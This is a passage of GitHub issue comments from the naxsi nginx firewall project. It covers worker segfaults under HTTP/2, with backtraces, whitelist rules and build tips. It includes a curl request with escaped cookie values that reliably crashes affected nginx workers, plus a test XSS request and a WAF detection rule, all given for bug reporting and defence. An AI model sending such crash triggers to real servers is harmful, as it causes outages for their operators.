0x00007feb1da4aa85 in ngx_worker_process_cycle (cycle=cycle@entry=0x7feb1f005020, data=data@entry=0x0) at src/os/unix/ngx_process_cycle.c:753\n18 0x00007feb1da4949a in ngx_spawn_process (cycle=cycle@entry=0x7feb1f005020, proc=proc@entry=0x7feb1da4aa30 ,\ndata=data@entry=0x0, name=name@entry=0x7feb1dace476 \"worker process\", respawn=respawn@entry=-3) at src/os/unix/ngx_process.c:198\n\n19 0x00007feb1da4ad30 in ngx_start_worker_processes (cycle=cycle@entry=0x7feb1f005020, n=1, type=type@entry=-3)\nat src/os/unix/ngx_process_cycle.c:358\n\n20 0x00007feb1da4bb4f in ngx_master_process_cycle (cycle=0x7feb1f005020) at src/os/unix/ngx_process_cycle.c:130\n21 0x00007feb1da27ac4 in main (argc=, argv=) at src/core/nginx.c:415\n``\n. Seems that removinghttp2` fixed the problem, thank you :)\n. @buixor: may be you could insert some warning or even error if naxsi is used with HTTP/2? It would be a small and easy change. Now it may be a bit confusing for new users.\n. Yep, unlike 1.9.x, which was mainline version, 1.10 is stable version, like 1.8 was. Is there anything you guys are going to do with it? I would even pay money for it (if I could convince my bosses that it's good investment).\n. @buixor: was long time ago, all that I saved is in this ticket. And I can't test new build on production load now, but I'll see if I can use it for 5-10 minutes on one of backends some days later.\n. Nope, this will allow all unknown headers and variables. That is dangerous: programmers can add new variables without notifying devops(actually, they do it sometimes, and then come to me arguing \"why is the production broken?\"), and this variables are left unfiltered. Or one of used frameworks/libraries can have \"magic\" headers or variables, we are not aware about. And they are left unfiltered. This approach weakens defense.\nI want not just to whitelist, but to filter unknown variables/headers. So the defense is not weakened.\nP.S. Voted up #271\n. Hi @buixor,\nYes, I want to strip them out. That will prevent sloppy queries from being blocked, yet not weakening the security. Actually, it will strengthen security a little. \n. You are welcome :) I am not expecting this to be done any time soon, but it would be helpful for use cases like ours.\n. @buixor I am a little overloaded now, but I promise I'll return in a couple days with a solid test case. I remember that in configuration I was building both SSI and echo_location were glitching inside internal location used to handle blocked requests: DeniedUrl \"/location_with_ssi\";.. @buixor seems I finally got it. It was quite a quest to catch when exactly it breaks :) Here is the test case:\n\nDeniedUrl points to location, where subrequests are used:\necho_location from echo module\nAlso works for SSI with include file= or include virtual=, \nkeepalive is enabled in nginx\nClient sends malformed request denied by Naxsi and then sends second request within the same keepalive connection\n\nExpected: first request gets response from DeniedUrl location, second request is processed as usual\nActual result: first request returns expected response, second request hangs forever\nEnvironment:\n GNU/Linux Ubuntu 14.04 Trusty\n nginx: 1.10.3\n nginx -V: https://gist.github.com/selivan/cac189d3b8ba167e43899cc908195114\n naxsi: 0.55.3\n* echo-nginx-module\nIf you disable echo_location inside problematic location, you will get expected result.\nHere is test nginx.conf: https://gist.github.com/selivan/10ed68156a869b4095c20a2d10cc101c\nTo make curl send requests in a single keepalive connection, you can use --config-file option with file like this(empty lines are mandatory):\n```\nurl=\"http://example.net/?wafprohibited=",
    "bbigras": "Maybe related to the \"Bugfix: a segmentation fault might occur in a worker process when using HTTP/2.\" in the latest nginx version.\nhttp://nginx.org/en/CHANGES\nI'll test tomorrow.\n. I also have had a crash. I don't know how to reproduce it yet.\n``\nReading symbols from /usr/sbin/nginx...Reading symbols from /usr/lib/debug/.build-id/7c/6f589235091c270b13731c005969fc22f4c29d.debug...done.\ndone.\n[New LWP 30858]\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/i386-linux-gnu/libthread_db.so.1\".\nCore was generated bynginx: worker process                   '.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n0  0x080f880e in nx_find_wl_in_hash (mstr=mstr@entry=0x8823150, cf=cf@entry=0x86ea644, zone=zone@entry=HEADERS) at /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:342\n342         mstr->data[i] = tolower(mstr->data[i]);\n(gdb) bt\n0  0x080f880e in nx_find_wl_in_hash (mstr=mstr@entry=0x8823150, cf=cf@entry=0x86ea644, zone=zone@entry=HEADERS) at /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:342\n1  0x080f8d5c in ngx_http_dummy_is_rule_whitelisted_n (req=req@entry=0x88225c8, cf=cf@entry=0x86ea644, r=r@entry=0x86c32a4, name=name@entry=0x8823150, zone=zone@entry=HEADERS,\ntarget_name=target_name@entry=0) at /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:629\n\n2  0x080fa5b7 in ngx_http_apply_rulematch_v_n (r=r@entry=0x86c32a4, ctx=ctx@entry=0x882330c, req=req@entry=0x88225c8, name=name@entry=0x8823150, value=value@entry=0x8823158, zone=zone@entry=HEADERS,\nnb_match=0, target_name=target_name@entry=0) at /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:1030\n\n3  0x080faf0c in ngx_http_basestr_ruleset_n (pool=0x88225a0, name=name@entry=0x8823150, value=value@entry=0x8823158, rules=0x86bd8c0, req=req@entry=0x88225c8, ctx=ctx@entry=0x882330c,\nzone=zone@entry=HEADERS) at /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:1397\n\n4  0x080fb2e3 in ngx_http_dummy_headers_parse (main_cf=main_cf@entry=0x85b8598, cf=cf@entry=0x86ea644, ctx=ctx@entry=0x882330c, r=r@entry=0x88225c8)\nat /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:2078\n\n5  0x080fcd98 in ngx_http_dummy_data_parse (ctx=ctx@entry=0x882330c, r=r@entry=0x88225c8) at /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_runtime.c:2102\n6  0x080fed3f in ngx_http_dummy_access_handler (r=0x88225c8) at /home/bbigras/nginx/nginx-1.9.15/debian/modules/naxsi/naxsi_src/naxsi_skeleton.c:1228\n7  0x080973c3 in ngx_http_core_rewrite_phase (r=0x88225c8, ph=0x879df94) at src/http/ngx_http_core_module.c:901\n8  0x08092e29 in ngx_http_core_run_phases (r=0x88225c8) at src/http/ngx_http_core_module.c:847\n9  0x080c62f8 in ngx_http_v2_process_request_body (r=0x88225c8, pos=pos@entry=0x87bf711 \"{\\\"Nom\\\":\\\"M05021\\\",\\\"Type\\\":\\\"NonPeinte\\\"}\\320b\\r&=LtA\\352\\373$\\343\\261\\005L\\034\\067\\341Y\\357\u0550\u0602\u0687\",\nsize=size@entry=35, last=1) at src/http/v2/ngx_http_v2.c:3587\n\n10 0x080c7513 in ngx_http_v2_state_read_data (h2c=0x86a5720, pos=0x87bf711 \"{\\\"Nom\\\":\\\"M05021\\\",\\\"Type\\\":\\\"NonPeinte\\\"}\\320b\\r&=LtA\\352\\373$\\343\\261\\005L\\034\\067\\341Y\\357\u0550\u0602\u0687\",\nend=0x87bf734 \"\\320b\\r&=LtA\\352\\373$\\343\\261\\005L\\034\\067\\341Y\\357\u0550\u0602\u0687\") at src/http/v2/ngx_http_v2.c:922\n\n11 0x080c8a0a in ngx_http_v2_read_handler (rev=) at src/http/v2/ngx_http_v2.c:362\n12 0x0807f78c in ngx_event_process_posted (cycle=, cycle@entry=0x85b64b8, posted=) at src/event/ngx_event_posted.c:33\n13 0x0807f35a in ngx_process_events_and_timers (cycle=cycle@entry=0x85b64b8) at src/event/ngx_event.c:259\n14 0x08085976 in ngx_worker_process_cycle (cycle=0x85b64b8, data=0x0) at src/os/unix/ngx_process_cycle.c:753\n15 0x080843a6 in ngx_spawn_process (cycle=cycle@entry=0x85b64b8, proc=0x80858f0 , data=0x0, name=0x8171fbb \"worker process\", respawn=respawn@entry=2)\nat src/os/unix/ngx_process.c:198\n\n16 0x080869f2 in ngx_reap_children (cycle=0x85b64b8) at src/os/unix/ngx_process_cycle.c:621\n17 ngx_master_process_cycle (cycle=, cycle@entry=0x85b2498) at src/os/unix/ngx_process_cycle.c:174\n18 0x080633de in main (argc=3, argv=0xbf8d5dd4) at src/core/nginx.c:367\n``\n. If you use a Debian based distro, you can use OpenSSL 1.0.2 easily with nginx without installing it. Uncompress OpenSSL 1.0.2h somewhere but don't build it (you'll built it with nginx with./configure --with-openssl). It's easy since we only rebuild the nginx package with an extra configure flag. You need deb-src lines to get the source withapt-get source`.\nwarning: you'll need to track OpenSSL's security updates and update it and rebuild if you want to stay secure.\nexport DEBFULLNAME='My Name'\nexport DEBEMAIL='my email'\nto have dch and debuild\napt-get install devscripts\ninstall the dependencies\napt-get build-dep nginx\napt-get source nginx\ncd nginx-1.11.3\nadd --with-openssl=/opt/openssl-1.0.2h \\ in COMMON_CONFIGURE_ARGS in debian/rules\nincrement the package version number with dch -i\nbuild without signing debuild -i -us -uc -b (you can sign it if you have a gpg key matching your email)\n. I think I read that even if you want it as a dynamic module you still have to build it at the same time than nginx.\n. ",
    "rfnx": "I just tested it and unfortunately it is still not working.\n. Same issue with nginx 1.9.7\nEDIT : same with 1.9.8 & 1.9.9\n. @blotus : Hello, is there any news on this issue ? I really want to use naxsi with http2 :)\n. @buixor Thanks for the answer !\n. @buixor Hello, thanks again for your work. I tried and naxsi still crashed. This is very easy to reproduce : for me, it happens everytime I click the \"connection\" button on my wordpress site, to go to the admin connection page (default to /wp-admin).\nConfiguration :\n- nginx version : 1.10.0;\n- naxsi version : 0.55rc1;\n- http/2 enabled;\n- Linux kernel with grsecurity.\nMy system log after the crash : \n```\nkernel: grsec: From 127.0.0.6: Segmentation fault occurred at 0000000000ad37e4 in /usr/bin/nginx[nginx:11381] uid/euid:33/33 gid/egid:33/33, parent /usr/bin/nginx[nginx:11379] uid/euid:0/0 gid/egid:0/0\nkernel: grsec: From 127.0.0.6: bruteforce prevention initiated for the next 30 minutes or until service restarted, stalling each fork 30 seconds.  Please investigate the crash report for /usr/bin/nginx[nginx:11381] uid/euid:33/33 gid/egid:33/33, parent /usr/bin/nginx[nginx:11379] uid/euid:0/0 gid/egid:0/0\nsystemd-coredump[11419]: Process 11381 (nginx) of user 33 dumped core.\n                                                    Stack trace of thread 11381:\n                                                    #0  0x00000000004c5964 nx_find_wl_in_hash (nginx)\n                                                    #1  0x00000000004c5e85 ngx_http_dummy_is_rule_whitelisted_n (nginx)\n                                                    #2  0x00000000004c7599 ngx_http_apply_rulematch_v_n (nginx)\n                                                    #3  0x00000000004c7ee2 ngx_http_basestr_ruleset_n (nginx)\n                                                    #4  0x00000000004c82c5 ngx_http_dummy_headers_parse (nginx)\n                                                    #5  0x00000000004c9980 ngx_http_dummy_data_parse (nginx)\n                                                    #6  0x00000000004cbc9e n/a (nginx)\n                                                    #7  0x00000000004563fc ngx_http_core_rewrite_phase (nginx)\n                                                    #8  0x0000000000451895 ngx_http_core_run_phases (nginx)\n                                                    #9  0x000000000045c973 ngx_http_process_request (nginx)\n                                                    #10 0x00000000004890a6 n/a (nginx)\n                                                    #11 0x0000000000489d76 n/a (nginx)\n                                                    #12 0x0000000000489fbe n/a (nginx)\n                                                    #13 0x0000000000488855 n/a (nginx)\n                                                    #14 0x000000000043e750 ngx_event_process_posted (nginx)\n                                                    #15 0x0000000000444921 n/a (nginx)\n                                                    #16 0x0000000000443350 ngx_spawn_process (nginx)\n                                                    #17 0x0000000000444c84 n/a (nginx)\n                                                    #18 0x00000000004455a4 ngx_master_process_cycle (nginx)\n                                                    #19 0x0000000000421838 main (nginx)\n                                                    #20 0x0000031d74329710 __libc_start_main (libc.so.6)\n                                                    #21 0x0000000000421d09 _start (nginx)\n\n                                                    Stack trace of thread 11392:\n                                                    #0  0x0000031d761333e8 pthread_cond_timedwait@@GLIBC_2.3.2 (libpthread.so.0)\n                                                    #1  0x00000000006f3095 n/a (nginx)\n                                                    #2  0x00000000006efb3a n/a (nginx)\n                                                    #3  0x000000000050b86e n/a (nginx)\n                                                    #4  0x00000000006f4588 n/a (nginx)\n                                                    #5  0x0000031d7612d424 start_thread (libpthread.so.0)\n                                                    #6  0x0000031d743f0cbd __clone (libc.so.6)\n\n```\n. @buixor  Do you want the headers ?\n. @buixor the request : \nHost: www.domain.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nDNT: 1\nReferer: https://www.domain.com/\nCookie: _pk_id.1.7821=31a0039524567e4f.454213867.255.14211887.1462687252.; _pk_ref.1.7821=%5B%22%22%2C%2C%2C%2C1462641772%2C%22https%3A%2C%22stats.domain.com%2Findex.php%3Fmodule%3DCoreHome%26action%3Dindex%26idSite%3D1%26period%3Dday%26date%3Dyesterday%22%5D; wp-settings-time-2=1467806457; wp-settings-1=unfold%3D1%26mfold%3Do%26post_dfw%3Doff%26posts_list_mode%3Dlist%26libraryContent%3Dbrowse%26editor%3Dtinymce%26hidetb%3D1; wp-settings-time-1=1467806457; wp-settings-2=post_dqs%3Ddsf; _pk_ses.1.7821=*\nConnection: keep-alive\n. @buixor thank YOU.\n. ",
    "Promaethius": "Hate to make this thread sound like a broken record, but do you have any news concerning http2 compatibility?\n. The initial comment clarified: \"Problem appeared after couple of minutes of nginx working with production load, synthetic tests did not reproduce it.\" This would make debugging the issue difficult.\n. Are you saying that a base nginx 1.11.1 or naxsi compiled 1.11.1 throws a segfault? And are you using the http2 naxsi branch?\n. OK. At what point does it segfault? What is it doing? And are you using the http2 branch for naxsi?\n. That is similar to most of the problems people have posted here. Buixor came up with a version of naxsi that, for the time being, works for nginx. The issue had to do with accessing and rewriting a read only memory location for headers. You can find that code under branch > http2\n. It has worked for a lot of folks, including me, but be aware that it is highly experimental. And be sure to reference issue #294 like buixor mentions above https://github.com/nbs-system/naxsi/issues/294\n. ",
    "TheDeadCode": "+1\n. ",
    "aledbf": "+1\n. ",
    "AnoopAlias": "Can you let me the status of this now that nginx 1.10.0 stable is released . I believe the bug affects this version too?\n. I am using vers=0.55rc1 with nginx-1.10.0 and having http2 enabled in ssl vhost.\nSo far I have not seen any crashes and a test was blocked by naxsi just fine\n2016/04/28 22:02:00 [error] 1463#1463: *891 NAXSI_FMT: ip=122.174.198.241&server=domain.net&uri=/index.php&learning=0&vers=0.55rc1&total_processed=1&total_blocked=1&block=1&cscore0=$XSS&score0=8&zone0=ARGS&id0=1302&var_name0=a, client: 122.174.198.241, server: domain.net, request: \"GET /index.php?a=%3C%3E HTTP/2.0\", host: \"domain.net\"\n. The issue seems to be not fixed with 0.55rc2 . I have a person complaining about this happening on his server which I have no access to (so can't get you any more details)  - https://support.sysally.net/boards/1/topics/3161 . But the important thing is that the issue seems not fixed.\n. I can confirm this tool is not working\nnxapi]# cat /var/log/nginx/error.log|grep NAXSI_FMT|wc -l\n18\nnxapi]# nxtool.py -x --colors -c nxapi.json --files=/var/log/nginx/error.log \nsize :1000\nWhitelist(ing) ratio :\nTop servers :\nTop URI(s) :\nTop Zone(s) :\nTop Peer(s) :\n\nnxapi]# curl -XPOST \"http://localhost:9200/nxapi/events/_search?pretty\" -d '{}'\n{\n  \"took\" : 7,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 5,\n    \"successful\" : 5,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : 0,\n    \"max_score\" : null,\n    \"hits\" : [ ]\n  }\n}\n\nShould the learning be done on both access log and error log ?\n. Looks like the data is being populated if we omit the \"-x\" switch\nnxtool.py -c nxapi.json --files=/var/log/nginx/error.log\nworks fine from my end . And as far as I can see..the learning need to be done only on error_log and not access log \n. Yes it works if we omit the -x switch . I think it's a mistake in the documentation\n. @buixor  - I think you have to edit the documentation at  https://github.com/nbs-system/naxsi/blob/master/nxapi/README.md\nParticularly the line\n\nLoad the data from the log file into ElasticSearch with the folloing command:\n./nxtool.py -x --colors -c nxapi.json --files=/PATH/TO/LOGFILE.LOG\n\n. Hi,\nyes the particular config had a lot of whitelist . I am using NAXSI in a plugin integrated with the popular cPanel control panel and this  automatically populates the whitelist rules with a script \n\nhttps://raw.githubusercontent.com/AnoopAlias/nDeploy/master/rpm_buildtree/nginx-pkg-64-common/usr/nginx/scripts/nxapi-learn.sh.disabled\n\nSince cPanel is mostly used in mass hosting setup and there will be lot of domains the whitelist file may get large for some domains .\nI asked the same question in nginx userlist and was pointed to modifying the hardcoded values \nhttps://github.com/nbs-system/naxsi/blob/master/naxsi_src/naxsi_utils.c#L569-#L573\nI am presently using  2048 for bucket size and 256000 for max_size .\nHopefully that will solve the issue?\n. @buixor - Thanks . Can you point to a better way of whitelist generation . Note that there will be mostly 500+ vhosts on a typical server in mass hosting  and each will be managed by different users .\nAlso can you point me to the regex check you do (or any another better way) to ensure the mz regex doesnt contain \"|\" . Right now my what I do is do a final nginx config test and if it fails notify the server admin that whitelist generation has failed . \nProbably its better if you incorporate the check in nxtool whitelist generation itself ;so any rule that may generate a nginx config test failure is not generated,\n. ",
    "peterhanneman": "+1 - Looking forward to getting NAXSI deployed with HTTP2 in production.\n. ",
    "Doemela": "I am using it on this server https://cyberguerrilla.info with no problems\n. Provide log of this else nobody can help. I use it on +10 WP sites never had this, this could be a plugin so start deactivate plugin till you can post. If you find plugin causing this set naxsi on learning and generate whitelist rules for this plugin.\n. Add this to wordpress whitelist:\nBasicRule wl:1310,1311 \"mz:$URL:/wp-admin/load-styles.php|$ARGS_VAR:load[]|NAME|ARGS\";\nBut I see allot of other errors due to plugins or deactivate those or make extra whitelist rules for them\nSet naxsi on learning, use the blog for a while then do:\nInstall elasticsearch\ncd /path/to/naxsi/nxapi\nservice elasticsearch start\n./nxtool.py --config=/path/to/naxsi/nxapi/nxapi/nxapi.json --files=/var/log/nginx/error.log.of.domain\n./nxtool.py -c nxapi.json  -x -s zk.in\n./nxtool.py -c nxapi.json -s zk.in -f --slack --colors > wl.txt && sed -n '/BasicRule  wl.*;/p' wl.txt > wl-WP.txt && rm wl.txt\nIn wl-WP.txt you will see whitelist rules add the ones for the plugins you use to the whitelist wordpress.rules\n. You can download rpm here https://www.elastic.co/downloads/elasticsearch\npath of nxapi is in the git u cloned https://github.com/nbs-system/naxsi/tree/master/nxapi\n. Add id 1015 to:\nBasicRule wl:1310,1311,1015 \"mz:$URL:/wp-admin/load-styles.php|$ARGS_VAR:load[]|NAME|ARGS\";\nThese for ubermenu\nBasicRule wl:1000 \"mz:$URL:/wp-admin/options.php|$BODY_VAR:ubermenu_main[style_submenu_dropshadow_opacity]|NAME\";\nBasicRule wl:1000 \"mz:$URL:/wp-admin/options.php|$BODY_VAR:ubermenu_main[dropdown_within_mega]|NAME\";\nThis for nav-menus\nBasicRule wl:1100 \"mz:$URL:/wp-admin/nav-menus.php|BODY\";\nYou can make new post?\n. elasticsearch is only needed to generate whitelist rules you can stop that process\n. > You referring to this ? https://github.com/nbs-system/naxsi/wiki/A-fail2ban-profile-for-Naxsi\n\nIf so, you are right, this was written before the learning flag was included within NAXSI_FMT :)\n\n@buixor Yes\n. A whitelist can't mix _X elements with _VAR or $URL items. ie:\nmz:$URL:/|$BODY_VAR_X:^fields|NAME;\nmust be:\nmz:$URL_X:^/$|$BODY_VAR_X:^fields$|NAME;\n. CheckRules instruct naxsi to take an action, so if action matches a rule it will do  (LOG, BLOCK, DROP, ALLOW) \nLast question has same answer I already gave\n. I use nginx 1.13.4 OpenSSL 1.0.2l debian jessie with +13 domains with naxsi http2 without any problems. Did update integration fail2ban: https://github.com/nbs-system/naxsi/wiki/integration-fail2ban check if I did it correct. ",
    "djeraseit": "so are we good to go? :)\n. ",
    "svpn": "I was getting workers segfaulting 100% of the time.  Applied fix and segfaults have stopped.\n. Fixed with pip install elasticsearch\nI suggest adding this step in the appropriate place in the documentation.\n. ",
    "sous-studio": "Nginx 1.11.1 with ssl http2 or just with ssl, throws segfault.\nHow to get rid of it?\nChange to:\nSecRulesEnabled;\nSecRulesDisabled;\nWhich is really not an option. So, it seems naxsi fails to work with ANY SSL connection. (not sure if disabling http2 upon compiling nginx would help)\nAnyway, if naxsi cannot work in SSL mode and we're all turning SSL it's a disaster....\n. Nginx 1.11.1 compiled with naxsi throws a segfault. I compiled it myself using default compilation options for Debian Jessie + naxsi module addon.\n. I'm sorry, what do you mean http2 branch? I use Nginx 1.11.1 with http2 enabled on ssl http2 setup.\nAbout when it happens:\nserver { with listen xxx ssl http2 and naxsi enabled in SecRulesEnabled mode.\nSite is Wordpress. When I browse the website - no troubles at all. But when I login to it, and try to logout - connection terminates and I get segfault.\nIf I try to add Post, I get few connections terminated on wordpress editor scripts (also segfault).\nThis does happen with both Wordpress.rules attached and detached.\n. Thank you!!! Compiling to test :)\n. Works!!! You're savior!!!! :+1: Thanks a lot!!!\n. Found an answer:\n./nxtool.py -c nxapi.json -f --filter 'ip YOURIP'\nFolks, it's counter-intuitive to have 'peers' displayed in the output, yet --filter 'peers IP' is not working. I'd suggest removing peers term and replacing it by ip, so people don't get lost between two.\n. Yes, sorry for mistyping here. Of course \"index\" : \"123\".\nSo what am I missing?\n. Sorry, haven't noticed your answer before. Yes, I use nxtool to insert data into ES, but tried non-default numeric index and it failed.\n. ",
    "marcelomd": "Hi,\nWe're still getting segfaults here. The specific request that reliably breaks Nginx is this: \ncurl 'https://example.com/' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36' --compressed -vso/dev/null  -H \"cookie: __atuvc=1%7C27%2C0%7C28%2C0%7C29%2C\"\nThis last cookie header is something sent by Chrome. There are others, but this is the one.\nWe merged Naxsi's master and http2 branches. Testing in our stage server with no traffic. I'll try to upload a core dump somewhere for you.\nThanks!\n. Here are the relevant parts:\n```\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004fca04 in nx_find_wl_in_hash (mstr=0x7ffeb547e6a0, cf=0x39bfa28, zone=HEADERS)\n    at /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_runtime.c:354\n354     mstr->data[i] = tolower(mstr->data[i]);\n(gdb) bt\n0  0x00000000004fca04 in nx_find_wl_in_hash (mstr=0x7ffeb547e6a0, cf=0x39bfa28, zone=HEADERS)\nat /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_runtime.c:354\n\n1  0x00000000004fce77 in ngx_http_dummy_is_rule_whitelisted_n (req=0x4987060, cf=0x39bfa28, r=0x4f6f9a0,\nname=0x7ffeb547e6a0, zone=HEADERS, target_name=0)\nat /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_runtime.c:641\n\n2  0x00000000004fd0ab in ngx_http_apply_rulematch_v_n (r=0x4f6f9a0, ctx=0x4f5a2b0, req=0x4987060,\nname=0x7ffeb547e6a0, value=0x4987cd8, zone=HEADERS, nb_match=1, target_name=0)\nat /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_runtime.c:1042\n\n3  0x00000000004fddb2 in ngx_http_basestr_ruleset_n (pool=, name=0x7ffeb547e6a0,\nvalue=0x4987cd8, rules=0x4ec2190, req=0x4987060, ctx=0x4f5a2b0, zone=HEADERS)\nat /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_runtime.c:1455\n\n4  0x00000000004fdf5a in ngx_http_dummy_headers_parse (main_cf=0x51d9ed0, cf=0x39bfa28, ctx=0x4f5a2b0, r=0x4987060)\nat /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_runtime.c:2140\n\n5  0x00000000004ffa06 in ngx_http_dummy_data_parse (ctx=0x4f5a2b0, r=0x4987060)\nat /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_runtime.c:2164\n\n6  0x0000000000503554 in ngx_http_dummy_access_handler (r=0x4987060)\nat /usr/src/debug/nginx-1.10.1/naxsi/naxsi_src/naxsi_skeleton.c:1176\n\n7  0x0000000000484f72 in ngx_http_core_rewrite_phase (r=0x4987060, ph=0x45831b8)\nat src/http/ngx_http_core_module.c:901\n\n8  0x0000000000481bfd in ngx_http_core_run_phases (r=0x4987060) at src/http/ngx_http_core_module.c:847\n```\n. By the way. It has something to do with cookie escaping.\nCookies like 'cookie: bla=%20', 'cookie:bla=\\', etc. trigger the segfault. Other headers don't.\nI'm using the standard Naxsi rules.\n. Hey @buixor \nThe config used in this test triggers the segfault in our staging servers, but not in a VM, even with our full Nginx build.\nTrying to pinpoint exactly what the difference is. Hold on.\nThanks!\n. Nope. I was wrong. Nginx segfaults with your test.\nMy local curl/libcurl in the dev VM did not support HTTP/2 and it was falling back to HTTP1, which works.\nAfter updating curl, Nginx segfaults =\\\n. Hehehe Happens to me all the time.\nI submitted a PR with a fix. Not beautiful, but I spent the day testing and it seems to work.\n. I should mention for anyone willing to try, the above mentioned implies a performance hit (which I did not have the time to measure), as we alloc and copy strings for every match in the header zone. Fair warning =)\n. This segfault is triggered when Naxsi checks if a matching rule is whitelisted (seems to be specific to the header zone). So probably this specific ADFS header is matching some rule.\nMy guess is that if Naxsi blocks this request with HTTP 1 (you may need to lower scores), you are seeing this issue.\nWhat if you issue this same request with other browser? With curl?\n. Hey,\nWe've been running #309 in production with a few clients for a couple of weeks. Not a single error =)\nThanks a lot!\n. SSL module can be loaded dynamically (from first batch of modules, here). Plus, Nginx uses system's openssl, so you can play around with that.\nI'm not sure about HTTP/2 module.\n. @combro2k Duh... my mistake =)\n. We haven't played with Naxsi for a while as it has been stable for months. #309 doesn't seem to degrade performance as much as I expected.\nAnyway, we're always willing to help. =). @danlsgiga @ManuelRighi Did you guys try PR #309 on top of http2 branch?\nWe've been running HTTP/2 + Naxsi for months with no errors.\nThe segfaults were caused by Naxsi trying to modify the header part of the request, which lives in read-only memory. See previous posts on this thread.\nUnless these are new segfaults, #309 should solve them =). @buixor Nothing new. Works beautifully for us as it is. Go ahead =). Sounds good.\nI'll write some tests and submit as soon as I have them.\nThanks!\n. Hi,\nAre these tests enough? Can't think of any other variation on that theme.\nThanks!\n. Hi,\nWe did some more work over this feature. It exports a new variable containing the action Naxsi took.\nAre you interested? Do I update this PR or open a new one?\nThanks!\n. Done.\nAdd 'naxsi_attack_action' variable:\n- $PASS: the request has been accepted\n- $BLOCK: the request was blocked\n- $LEARNING-PASS: naxsi is in learning mode and the request has been accepted\n- $LEARNING-BLOCK: the request would be blocked but, due to being in learning mode, it was not.\n. Yay \\o/!\nWe're good to go.\nThanks a lot!\n. Hi, I extended this PR with #258.\nI don't really know what is the best way to do the merge dance with them hehehe.. Hahaha, that's awesome. I just did my homework =)\nGlad we can help.\nThanks!\n. Hi,\nIt's passing all our tests now. Looks like it works!\nI think we can close this.\nThanks a lot!\n. Maybe #258 can help.\n. Yeah, I know =D\nIt's not pretty and will degrade performance, same thinking here. But since we needed Naxsi+HTTP/2 \"for yesterday\", as we say here, I figured I'd try a quick fix and buy some time to dig deeper into it.\nI'm sharing in case anyone wishes to take the performance hit anyway. Maybe a warning in the commit message. Whichever you decide, to merge or not, is great. We're glad to help =)\n. Hey,\nWe also couldn't think of anything better. Sorry about that.\nWe thought about copying the whole header area and working only there. However, this has its own drawbacks.\nAnother idea was to patch Nginx's HTTP/2 module. I doubt the Nginx guys would approve hehehe.\n. Hi,\nWe have a commit that exposes the variables that compose NAXSI_FMT. If this is what you're looking for I can make a PR later this week.. Done! #388. By the way, we use it live. Works as expected, but we appreciate an extra set of eyes =). ",
    "danlsgiga": "Hey folks... \nI'm having the very same segfault issue in my dev environment using the http2 naxsi branch. What is the most intriguing part is that the issue only happens when I'm using Firefox (latest version)... I've tested the very same call using Chrome / IE and even Edge (all latest versions as well) and they all work fine!\nAs soon as I disable http2 on Firefox the call works as expected.\nThe call that triggers the segfault is a response from ADFS containing a very large token in var SAMLResponse.\nI don't know exactly if this is a poor http2 implementation on Firefox or if this is a Naxsi issue.\nDoes anyone have any clue about this?\n. Hey @marcelomd, thanks for the quick reply. \nI just (30 seconds ago) figured that Chrome removed support for NPN and only accepts ALPN now. In sum, Chrome is falling back to HTTP/1.1 because ALPN is available only for OpenSSL 1.0.2+ which almost none of the upstream distros support yet, except Ubuntu 16.04. That's why it is working on Chrome / IE and Edge, they are falling back to HTTP/1.1 and Firefox is not.\nI have naxsi on learning mode and none whitelists set.\n. I'll just fallback to http/1.1 for now and get back to the naxsi master branch. Once we have a fully supported platform for http2 then I'll get back to it. Thanks everyone.\n. Sorry if I'm doing an absolutely absurd or dumb question but is it possible to have the ssl module compiled as a dynamic module?\nI'd bet the answer is a big and sound no... just wondering.\nThat would help me to have openssl 1.0.2 with ALPN support + HTTP2 without having to rely on recompiling the whole nginx.\n. Ok, so from my understading if I get an Ubuntu 16.04, compile nginx with the ssl module dynamically and put only the module in a CentOS 7 installation... would that work?\n. I've compiled nginx 1.11.12 + naxsi with http2 branch + openssl 1.1.0e and after around 3 hours troubleshooting why when I enable http2 on the listen directive chrome breaks I've found that one MainRule is causing the whole http2 implementation to fail.\nMainRule \"str:0x\" \"msg:0x, possible hex encoding\" \"mz:BODY|URL|ARGS|$HEADERS_VAR:Cookie\" \"s:$SQL:2\" id:1002;\nOnce I commented this rule on the core.rules, everything started working just fine. I have no idea why.\nP.S: I'm also using the proxy_protocol on the listen directive but it doesn't seem to be the root cause.\nUPDATE: Another finding... Looks like $HEADERS_VAR:Cookie is the piece causing the whole issue. Even if I change Cookie to another string it works, only with Cookie the http2 crashes.. I actually had to remove all the $HEADERS_VAR:Cookie from all MainRules in the core.rules file. For some reason, having it with HTTP2 causes the segfaults. Removed them and no issues for 2 days.\nI know that removing it is not ideal but having HttpOnly; Secure in the headers kinda overcome most of the cookies attacks, so I'll leave it out for 